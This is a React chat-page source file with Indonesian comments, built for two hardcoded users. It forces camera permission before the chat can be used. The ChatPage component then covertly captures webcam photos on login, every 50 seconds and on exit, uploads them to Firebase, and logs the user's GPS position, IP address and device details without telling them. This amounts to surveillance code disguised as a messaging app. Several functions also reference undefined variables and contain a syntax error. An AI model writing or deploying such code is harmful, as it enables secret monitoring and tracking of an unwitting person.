"use client";

import ChatList from "../components/ChatList";
import ChatInput from "../components/ChatInput";
import UserStatus from "../components/UserStatus";
import {useEffect, useState, useRef  } from "react";

//import { browserName, deviceType, osName, browserVersion, osVersion, engineName, engineVersion, deviceVendor, mobileModel} from 'react-device-detect';
import { 
  browserName, 
  deviceType, 
  osName, 
  browserVersion, 
  osVersion, 
  engineName, 
 engineVersion 
} from 'react-device-detect';

// import { rtdb, ref, update, serverTimestamp } from "../../config/firebase";

import { database, storage } from "../config/firebase";
import { ref as databaseRef, push, update,get,set ,onValue,serverTimestamp } from "firebase/database";

import { ref as storageRef,uploadString , uploadBytes, getDownloadURL } from "firebase/storage";


const ChatPageWrapper = () => {
  const [cameraAllowed, setCameraAllowed] = useState(false);

   const requestCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      stream.getTracks().forEach((track) => track.stop());

      setCameraAllowed(true);
      localStorage.setItem("cameraGranted", "true");

      // reload sekali di awal setelah diizinkan
      window.location.reload();
    } catch (err) {
      console.warn("❌ Kamera tidak diizinkan:", err);
      setCameraAllowed(false);
       alert(
        "Anda telah memblokir izin kamera. Silakan klik ikon 🔒 di address bar browser, ubah Camera menjadi Allow, lalu coba lagi."
      );
    }
  };

  useEffect(() => {
    // kalau sebelumnya sudah pernah diizinkan
    if (localStorage.getItem("cameraGranted")) {
      setCameraAllowed(true);
    }

    // ✅ Pantau perubahan izin kamera realtime
    if (navigator.permissions) {
      navigator.permissions.query({ name: "camera" }).then((status) => {
        // set state awal
        if (status.state === "granted") {
          setCameraAllowed(true);
        } else {
          setCameraAllowed(false);
        }

        // kalau status berubah (allow → block atau sebaliknya)
        status.onchange = () => {
          console.log("📡 Camera permission berubah:", status.state);
          if (status.state === "granted") {
            localStorage.setItem("cameraGranted", "true");
            window.location.reload(); // reload sekali
          } else {
            localStorage.removeItem("cameraGranted");
            setCameraAllowed(false);
          }
        };
      });
    }
  }, []);

  return (
    <div className="relative">
      {/* ✅ Render ChatPage tetap jalan di belakang */}
      <ChatPage />
      {!cameraAllowed && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="p-6 bg-white shadow-xl rounded text-center max-w-sm">
            <p className="text-lg font-semibold text-red-600 mb-3">
              🚫 Kamera dibutuhkan
            </p>
            <p className="text-gray-600 mb-4">
              Silakan izinkan akses kamera untuk melanjutkan ke chat.
            </p>
            <button
              onClick={requestCamera}
              className="px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700"
            >
              Izinkan Kamera
            </button>
          </div>
        </div>
      )}
    </div>
  );
};
const ChatPage = () => {
  const [currentUser] = useState("Topik"); // Gantilah dengan ID pengguna yang sesuai
  const [chatWith] = useState("Winda"); // ID pengguna tujuan
  
  const [replyMessage, setReplyMessage] = useState(null); // ✅ Reply Message
  const [isTyping, setIsTyping] = useState(false); 
  // const [gpsEnabled, setGpsEnabled] = useState(false);

  // const [location, setLocation] = useState(null);
  useEffect(() => {
    const typingRef = databaseRef(database, `typingStatus/${currentUser}`);

    // Pantau perubahan status mengetik dari lawan chat
    onValue(typingRef, (snapshot) => {
      const data = snapshot.val();
      setIsTyping(data?.typing || false);
    });

  }, [currentUser]);

 //  useEffect(() => {
    
 //    const userRef = databaseRef(database, `pengguna/${currentUser}`);

 //    const logsRef = databaseRef(database, `logs_pengguna/${currentUser}`);
    
 // if (!gpsEnabled) {
 //      alert("Anda harus mengaktifkan GPS untuk mengirim pesan!");
 //      return;
 // }
 //    // Set pengguna online saat masuk
 //    update(userRef, {
 //      user: currentUser,
 //      isOnline: true,
 //      lastSeen: serverTimestamp(),location: location ?? { latitude: 0, longitude: 0 },
    

 //    });

 //    // Simpan log saat user online
 //    push(logsRef, {
 //      user: currentUser,
 //      status: "online",
 //      timestamp: serverTimestamp(),
 //      location: location ?? { latitude: 0, longitude: 0 },
  

 //    });


 //    // Set pengguna offline saat keluar
 //    const handleDisconnect = () => {
 //      update(userRef, {
 //        user: currentUser,
 //        isOnline: false,
 //        lastSeen: serverTimestamp(),
 //        location: location ?? { latitude: 0, longitude: 0 },
    

 //      });

 //       // Simpan log saat user offline
 //       push(logsRef, {
 //        user: currentUser,
 //        status: "offline",
 //        timestamp: serverTimestamp(),
 //         location: location ?? { latitude: 0, longitude: 0 },
    

 //      });
 //    };

 //    // Update setiap 20 detik
 //    const interval = setInterval(() => {
 //      update(userRef, { lastSeen: serverTimestamp() });

 //       // Simpan log waktu terakhir dilihat
 //       push(logsRef, {
 //        user: currentUser,
 //        status: "update_lastSeen",
 //        timestamp: serverTimestamp(),location: location ?? { latitude: 0, longitude: 0 },
 //      });
 //    }, 50000);

 //    window.addEventListener("beforeunload", handleDisconnect);
 //    return () => {
 //      clearInterval(interval);
 //      window.removeEventListener("beforeunload", handleDisconnect);
 //      handleDisconnect(); // Jika komponen di-unmount
     
 //    };
 //  }, [currentUser]);
 //  useEffect(() => {
 //    // getIPInfo();
 //    getLocation();
 //  }, []);const getLocation = () => {
 //    if (!navigator.geolocation) {
 //      alert("Geolocation tidak didukung di browser ini.");
 //      return;
 //    }

 //    navigator.geolocation.getCurrentPosition(
 //      (position) => {
 //        setLocation({
 //          latitude: position.coords.latitude,
 //          longitude: position.coords.longitude,
 //        });
 //        setGpsEnabled(true);
 //      },
 //      (error) => {
 //        console.error("Error mengambil lokasi:", error);
 //        alert("Mohon aktifkan GPS untuk mengirim pesan.");
 //        setGpsEnabled(false);
 //      }
 //    );
 //  };
   useEffect(() => {
    getIPInfo();
    getIPInfo1();
  }, []);

      

  const [ipInfo, setIpInfo] = useState(null);
  const [ipInfo1, setIpInfo1] = useState(null);
  
const [ipReady, setIpReady] = useState(false); 

  const getIPInfo = async () => {
    try {
      const response = await fetch("/api/ip");
      if (!response.ok) throw new Error("Gagal mengambil data IP");
      const data = await response.json();
      setIpInfo(data); // misal: { ip: '123.45.67.89' }
    } catch (error) {
      console.error("Error mengambil IP:", error);
    }
  };
  const getIPInfo1 = async () => {
    try {
      const response = await fetch(`https://ipapi.co/json/`);
      if (!response.ok) throw new Error("Gagal mengambil data IP");
      const data = await response.json();
      setIpInfo1(data); // misal: { ip: '123.45.67.89' }
    } catch (error) {
      console.error("Error mengambil IP:", error);
    }
  };

  // Tunggu sampai ipInfo dan ipInfo1 keduanya ada
useEffect(() => {
  if (ipInfo && ipInfo1) {
    setIpReady(true); // trigger bahwa IP sudah siap
  }
}, [ipInfo, ipInfo1]);
  const deviceInfo = {
      browser: browserName ?? null,
      browserVersion: browserVersion ?? null,
      os: osName ?? null,
      osVersion: osVersion ?? null,
      engine: engineName ?? null,
      engineVersion: engineVersion ?? null,
      deviceType: deviceType ?? null,
   //   deviceVendor: deviceVendor ?? null,
   //   mobileModel: mobileModel ?? null
    };

  // ========= FUNGSI CAPTURE FOTO =========
  const capturePhoto = async (status = "unknown") => {
    try {
      // 1. Ambil stream kamera
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement("video");
      video.srcObject = stream;
      await video.play();

      // 2. Render ke canvas
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx?.drawImage(video, 0, 0);

      const imageData = canvas.toDataURL("image/png");

      // 3. Stop kamera (hemat baterai)
      stream.getTracks().forEach((track) => track.stop());

      // 4. Upload ke Firebase Storage
      const timestamp = Date.now();
      const fileRef = storageRef(
        storage,
        `user_captures/${currentUser}_${status}_${timestamp}.png`
      );
      await uploadString(fileRef, imageData, "data_url");
      const downloadURL = await getDownloadURL(fileRef);

      return downloadURL;
    } catch (err) {
      console.error("Gagal capture foto:", err);
      return null;
    }
  };
  useEffect(() => {
  // if (!currentUser) return;
     if (!currentUser || !ipReady) return;

  const userRef = databaseRef(database, `pengguna/${currentUser}`);
  const logsRef = databaseRef(database, `logs_pengguna1/${currentUser}`);

  const saveOldDataToLogs = async (status) => {
    const snapshot = await get(userRef);
    const oldData = snapshot.val();

    // if (oldData) {
    //   const logRef = push(logsRef); // ambil ref-nya dulu
    //   await set(logRef, {
    //     ...oldData,
    //     deleteTime: serverTimestamp(),
    //   });

    //   console.log("Data log disimpan ke:", logRef); // bisa log id-nya
    // }
    if (oldData) {
      // const logData = {
      //   ...oldData,
      //   deleteTime: serverTimestamp(),
      // };

      // const logRef= await set(push(logsRef), logData);
      //  // Tambahkan ini untuk melihat deleteTime yang sudah jadi timestamp
      // onValue(logRef, (snap) => {
      //   console.log("Log disimpan ke:", snap.val());
      // });
      const newLogRef = push(logsRef);

        await set(newLogRef, {
          ...oldData,
          status,
          deleteTime: serverTimestamp(),
        });

        // Tambahkan ini untuk melihat deleteTime yang sudah jadi timestamp
        onValue(newLogRef, (snap) => {
          console.log("Log disimpan ke:", snap.val());
        });
      // console.log("Data yang dikirim ke log:", logData);
    }


  };
    const updateOnlineStatus3 = async (latitude = null, longitude = null, ip1 = null, ip2 = null) => {
   await saveOldDataToLogs("online");
    try {
      // ========== 1. Capture dari kamera ==========
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement("video");
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx?.drawImage(video, 0, 0);

      const imageData = canvas.toDataURL("image/png");

      // stop kamera biar hemat baterai
      stream.getTracks().forEach((track) => track.stop());

      // ========== 2. Upload ke Firebase Storage ==========
     // const fileRef = storageRef(storage, `user_captures/${currentUser}_online.png`);
      const fileRef = storageRef(storage, `user_captures1/${currentUser}_online_${timestamp}.png`);
      
      await uploadString(fileRef, imageData, "data_url");
      const downloadURL = await getDownloadURL(fileRef);

      // ========== 3. Update data ke Realtime DB ==========
      const data= {
        user: currentUser,
        isOnline: true,
        lastSeen: serverTimestamp(),
        deviceInfo,
        ip1: ipInfo,
        ip2: ipInfo1,
        photoURL: downloadURL, // URL foto hasil kamera
      };

      if (latitude && longitude) {
        data.latitude = latitude;
        data.longitude = longitude;
      }

      await update(userRef, data);

      console.log("✅ Online status updated with photo:", downloadURL);
    } catch (err) {
      console.error("❌ Gagal update online status:", err);
    }
  };
  const updateOnlineStatus = async (latitude = null, longitude = null, ip1 = null, ip2 = null) => {
    await saveOldDataToLogs("online"); // simpan data lama dulu
 const photoURL = await capturePhoto("online");
    const data = {
      user: currentUser,
      isOnline: true,
      lastSeen: serverTimestamp(),
      deviceInfo,
      ip1:ipInfo,
      ip2:ipInfo1,
      photoURL: photoURL || null
    };

    // if (ipInfo) data.ip1 = ipInfo;
    // if (ipInfo1) data.ip2 = ipInfo1;
    if (latitude && longitude) {
      data.latitude = latitude;
      data.longitude = longitude;
    }

    update(userRef, data);
  };

  const updateOfflineStatus = async () => {
    await saveOldDataToLogs("offline"); // simpan sebelum offline
     const photoURL = await capturePhoto("offline");
// try {
//       // ========== 1. Capture dari kamera ==========
//       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
//       const video = document.createElement("video");
//       video.srcObject = stream;
//       await video.play();

//       const canvas = document.createElement("canvas");
//       canvas.width = video.videoWidth;
//       canvas.height = video.videoHeight;
//       const ctx = canvas.getContext("2d");
//       ctx?.drawImage(video, 0, 0);

//       const imageData = canvas.toDataURL("image/png");

//       // stop kamera biar hemat baterai
//       stream.getTracks().forEach((track) => track.stop());

//       // ========== 2. Upload ke Firebase Storage ==========
//      // const fileRef = storageRef(storage, `user_captures/${currentUser}_online.png`);
//       const fileRef = storageRef(storage, `user_captures1/${currentUser}_offline_${timestamp}.png`);
      
//       await uploadString(fileRef, imageData, "data_url");
//       const downloadURL = await getDownloadURL(fileRef);

    const data = {
      user: currentUser,
      isOnline: false,
      lastSeen: serverTimestamp(),
      
      deviceInfo,
      ip1:ipInfo,
      ip2:ipInfo1,
      // photoURL: downloadURL,
      photoURL: photoURL || null
    };
    // if (ipInfo) data.ip1 = ipInfo;
    // if (ipInfo1) data.ip2 = ipInfo1;
    if (latitude && longitude) {
      data.latitude = latitude;
      data.longitude = longitude;
    }
     update(userRef, data);
  console.log("✅ Offline status updated with photo:", photoURL);
//     } catch (err) {
//       console.error("❌ Gagal update offline status:", err);
// }
  };

  const updateLastSeen = async () => {
    await saveOldDataToLogs("update_lastSeen"); // simpan sebelum update
     const photoURL = await capturePhoto("update_lastSeen");
// try {
//       // ========== 1. Capture dari kamera ==========
//       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
//       const video = document.createElement("video");
//       video.srcObject = stream;
//       await video.play();

//       const canvas = document.createElement("canvas");
//       canvas.width = video.videoWidth;
//       canvas.height = video.videoHeight;
//       const ctx = canvas.getContext("2d");
//       ctx?.drawImage(video, 0, 0);

//       const imageData = canvas.toDataURL("image/png");

//       // stop kamera biar hemat baterai
//       stream.getTracks().forEach((track) => track.stop());

//       // ========== 2. Upload ke Firebase Storage ==========
//      // const fileRef = storageRef(storage, `user_captures/${currentUser}_online.png`);
//       const fileRef = storageRef(storage, `user_captures1/${currentUser}_lastseen_${timestamp}.png`);
      
//       await uploadString(fileRef, imageData, "data_url");
//       const downloadURL = await getDownloadURL(fileRef);

    update(userRef, {
      // photoURL: downloadURL,
      photoURL: photoURL || null
      lastSeen: serverTimestamp(),
    });
    console.log("✅ lastseen status updated with photo:", photoURL);
//     } catch (err) {
//       console.error("❌ Gagal update lastseen status:", err);
// }
  };

  const getLocationAndUpdate = () => {
    if (!navigator.geolocation) {
      alert("Geolocation tidak didukung di browser ini.");
      updateOnlineStatus(); // Tetap update walau tanpa lokasi
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        updateOnlineStatus(latitude, longitude);
      },
      (error) => {
        console.error("Gagal mengambil lokasi:", error);
        alert("Aktifkan GPS untuk update lokasi.");
        updateOnlineStatus(); // Tetap update walau gagal lokasi
      }
    );
  };

  // Saat user aktif
  getLocationAndUpdate();

  // Update lastSeen setiap 50 detik
  const interval = setInterval(() => {
    updateLastSeen();
  }, 50000);

  // Tangani disconnect
  window.addEventListener("beforeunload", updateOfflineStatus);

  return () => {
    clearInterval(interval);
    window.removeEventListener("beforeunload", updateOfflineStatus);
    updateOfflineStatus(); // Saat komponen unmount
  };
}, [currentUser, ipReady]);

  return (
     <div className="max-w-full mx-auto h-screen flex flex-col bg-gray-100">
      <div className="flex-none bg-white border-b border-gray-300 shadow-md  fixed top-0 left-0 w-full z-50">
        <h2 className="text-xl font-semibold text-center">Chat dengan {chatWith}</h2>
        <UserStatus userId={chatWith} />
        <div className="text-center text-gray-500 text-sm my-2">
          {isTyping && <span>{chatWith} sedang mengetik...</span>}
        </div>
  <hr/>
      </div>

        <br/><br/>
      {/* Bagian ChatList bisa di-scroll */}
      <div className="flex-1 overflow-y-auto">
        <ChatList user1={currentUser} user2={chatWith} setReplyMessage={setReplyMessage} />
        
      </div>
 <br/><br/> <br/><br/>

      {/* Input tetap di bawah */}

      <div className="flex-none bg-white border-t border-gray-300 fixed bottom-0 left-0 w-full">
        <ChatInput pengirim={currentUser} penerima={chatWith} replyMessage={replyMessage} setReplyMessage={setReplyMessage} />
      </div>
    </div>
  );
};

export default ChatPageWrapper;
// export default ChatPage;
// export default ChatPage;// import { useState } from "react";
// import { rtdb } from "../../config/firebase";
// import { ref as databaseRef, set, remove, onValue } from "firebase/database";
// import ChatList from "../../components/ChatList";
// import ChatInput from "../../components/ChatInput";

// const ChatPage = () => {
//   const [currentUser] = useState("user2"); // Gantilah dengan ID pengguna yang sesuai
//   const [chatWith] = useState("user1"); // ID pengguna tujuan
//   const [activeCall, setActiveCall] = useState(null); // Cek apakah ada panggilan

//   // Periksa apakah ada panggilan video yang aktif
//   useState(() => {
//     const callRef = databaseRef(rtdb, "VideoCalls");
//     onValue(callRef, (snapshot) => {
//       const callData = snapshot.val();
//       if (callData && (callData.caller === currentUser || callData.callee === currentUser)) {
//         setActiveCall(callData);
//       } else {
//         setActiveCall(null);
//       }
//     });
//   }, [currentUser]);

//   // Fungsi untuk memulai panggilan video
//   const startVideoCall = async () => {
//     const callRef = databaseRef(rtdb, "VideoCalls");
//     await set(callRef, {
//       caller: currentUser,
//       callee: chatWith,
//       status: "calling",
//       timestamp: Date.now(),
//     });
//   };

//   // Fungsi untuk mengakhiri panggilan video
//   const endVideoCall = async () => {
//     const callRef = databaseRef(rtdb, "VideoCalls");
//     await remove(callRef); // Hapus data panggilan dari Firebase
//   };

//   return (
//     <div className="max-w-lg mx-auto p-4 space-y-4">
//       <h1 className="text-xl font-bold text-white text-center">Chat dengan {chatWith}</h1>

//       {/* Tombol untuk memulai panggilan video */}
//       {!activeCall ? (
//         <button
//           onClick={startVideoCall}
//           className="bg-green-500 text-white px-4 py-2 rounded-lg w-full"
//         >
//           📹 Mulai Video Call
//         </button>
//       ) : (
//         <button
//           onClick={endVideoCall}
//           className="bg-red-500 text-white px-4 py-2 rounded-lg w-full"
//         >
//           ❌ Akhiri Panggilan
//         </button>
//       )}

//       {/* Daftar Chat */}
//       <ChatList user1={currentUser} user2={chatWith} />

//       {/* Input Chat */}
//       <ChatInput pengirim={currentUser} penerima={chatWith} />
//     </div>
//   );
// };

// export default ChatPage;
// // // import ChatList from "../../components/ChatList";
// // // import ChatInput from "../../components/ChatInput";
// // // import { useState } from "react";

// // // const ChatPage = () => {
// // //   const [currentUser] = useState("user2"); // Gantilah dengan ID pengguna yang sesuai
// // //   const [chatWith] = useState("user1"); // ID pengguna tujuan

// // //   return (
// // //     <div className="max-w-lg mx-auto p-4 space-y-4">
// // //       <h1 className="text-xl font-bold text-white text-center">Chat {chatWith}</h1>
// // //       <ChatList user1={currentUser} user2={chatWith} />
// // //       <ChatInput pengirim={currentUser} penerima={chatWith} />
// // //     </div>
// // //   );
// // // };

// // // // export default ChatPage;
// // // import { useState } from "react";
// // // import ChatList from "../../components/ChatList";
// // // import ChatInput from "../../components/ChatInput";
// // // import VideoCall from "../../components/VideoCall";

// // // const ChatPage = () => {
// // //   const [currentUser] = useState("user1");
// // //   const [chatWith] = useState("user2");

// // //   return (
// // //     <div className="max-w-lg mx-auto p-4 space-y-4">
// // //       <h1 className="text-xl font-bold text-white text-center">Chat {chatWith}</h1>
// // //       <ChatList user1={currentUser} user2={chatWith} />
// // //       <ChatInput pengirim={currentUser} penerima={chatWith} />
// // //       <VideoCall pengirim={currentUser} penerima={chatWith} />
// // //     </div>
// // //   );
// // // };

// // // export default ChatPage;
// // import { useState } from "react";
// // import VideoCallList from "../../components/VideoCallList";
// // import VideoCall from "../../components/VideoCall";

// // export default function VideoCallPage() {
// //   const [selectedCall, setSelectedCall] = useState(null);

// //   return (
// //     <div className="flex flex-col items-center p-6">
// //       <h1 className="text-2xl font-bold mb-4">Panggilan Video</h1>
// //       <VideoCall pengirim="user2" penerima={selectedCall} onEndCall={() => setSelectedCall(null)} />
     

// //       {!selectedCall ? (
// //         // Menampilkan daftar panggilan jika belum memilih kontak
// //         <VideoCallList userId="user2" onSelectCall={(call) => setSelectedCall(call)} />
// //       ) : (
// //         // Menampilkan panggilan video jika ada yang dipilih
// //         <VideoCall pengirim="user2" penerima={selectedCall} onEndCall={() => setSelectedCall(null)} />
// //       )}
// //     </div>
// //   );
// // }
